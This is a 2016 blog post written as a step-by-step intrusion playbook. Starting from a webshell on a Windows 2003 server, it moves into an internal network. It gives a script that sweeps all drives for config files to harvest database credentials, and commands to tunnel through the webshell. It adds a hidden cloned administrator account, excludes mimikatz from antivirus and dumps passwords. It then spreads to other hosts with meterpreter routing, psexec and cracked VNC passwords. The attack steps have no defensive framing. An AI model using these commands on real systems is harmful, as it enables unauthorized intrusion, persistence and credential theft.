---
layout:     post
title:      Inside network in workgroup
date:       2016-04-10
summary:    from one windows 2003 to inside network privilege
categories: web
tags:
 - inside network
 - windows
 - aspx
 - 工作组
---

### 0x01 Base
    got a webshell of xxx.xxx.xxx.101(run aspx)  
    don't know how to get system shell from this webshell  
    there exists not only one site on xxx.xxx.xxx.101  
    find xxx.xxx.xxx.101 has another address 10.10.10.101

### 0x02 Steps  

#### 1>search web.config on all sites to find sa and sapass

```
1.bat
@echo off
goto :main
这是注释:(for /f "delims="的作用为取消默认的以空格等符号作为分割符
dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具
体路径,不能是变量,这样就不能遍历全部磁盘了)
:main
set str=c d e f g h i j k l m n o p q r s t u v w x y z 
echo  当前硬盘的分区有: 
for %%i in (%str%) do (
if exist %%i: (echo %%i:
for /f "delims=" %%j in ('dir /b /s %%i:\web.conf?g %%i:\global.a?a %%i:\wp-config.p?p %%i:\setting.p?p %%i:\database.p?p %%i:\config.p?p %%i:
\config.ini.p?p %%i:\conn.p?p %%i:\connect.p?p %%i:\conn.a?p %%i:\conn.a?a') do (
echo *****filepath***** >> tmp.txt
echo %%j >> tmp.txt
type "%%j" >> tmp.txt
echo. >> tmp.txt
echo ---------------------------- >> tmp.txt
echo 我是美丽的分割线 >> tmp.txt
echo ---------------------------- >> tmp.txt
echo. >> tmp.txt
)
)
)

2.vbs
Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c 1.bat",vbhide

cscript 2.vbs
```

##### or download from:`https://github.com/3xp10it/bat/tree/master/get_web_config_bat`

#### [\+] find sa and sapass of 10.10.10.1,but as a inside network pc,3389 is not allowed from outside

#### 2>upload a tunnel.aspx(from reGeorg) to  xxx.xxx.xxx.101
```
[python] reGeorg.py -p 1080 -u https://xxx.xxx.xxx.101/xx/tunnel.aspx
```

#### 3>use sa pri in chopper execute:  
```
net user tmp /add & net localgroup administrators tmp /add  
net localgroup "remote desktop users" tmp /add
```

#### 4>runas admin->cmd-> mstsc /console /v:10.10.10.1 -admin
```
[10.10.10.1:3389 with tmp account]:  
add a superhide administrator account cloned from administrator account:  
net user tmp$ /add & net localgroup administrators tmp$ /add
regedit->local machine->sam->account->name
export 0x111<assume as administrator's> as admin.reg
export 0x222<assume as tmp$'s> as user.reg
export account->name->tmp$ as tmp.reg
copy /F value from admin.reg to user.reg
net user tmp$ /del
import tmp.reg and user.reg
delete admin.reg,user.reg,tmp.reg
logoff

[10.10.10.1:3389 with tmp$ account]:  
net user tmp /del
open setup of eset to add exclude file path
copy \\tsclient\mimikatz\ exclude_folder

[run mimikatz]:  
privilege::debug
sekurlsa::logonpasswords
```

#### 5>upload a meterpreter payload to 10.10.10.1
```
meterpreter>run get_local_subnets
            10.0.0.0/255.0.0.0
meterpreter>background
(handler)>route add 10.0.0.0 255.0.0.0 1
(handler)>route print
(handler)>use auxiliary/scanner/portscan/tcp
set ports 25,110,21,80,8080,443,1433,3606,3389,5900
set rhosts 10.10.10.0/24
set threads 24
exploit

smb:
(handler)use exploit/windows/smb/psexec
(handler)set rhosts 10.10.10.0/24
(handler)set username and pass from sekurlsa::logonpasswords in mimikatz before
or the password find by mimikatz in msf:
load  mimikatz
mimikatz_command -f sekurlsa::searchPasswords
(handler)exploit
enter other pc by smbpass
use mimikatz to find morepassword
search regedit to find morevncpassword

vnc:
search winvnc password in 10.10.10.1:
if ini file with password was delete,then open regedit search "password" 
F3+F3+F3...
find vnc password
use vnccrack tool in cain to carck it
get vncpassword
use auxiliary/scanner/vnc/vnc_login
set rhosts 10.10.10.0/24
set password vpnpassword
exploit
enter other pc by vnc password
use mimikatz to find morepassword
search regedit to find morevncpassword

smb&vnc
use morepassword in exploit/windows/smb/psexec
use morevncpassword in auxiliary/scanner/vnc/vnc_login



```
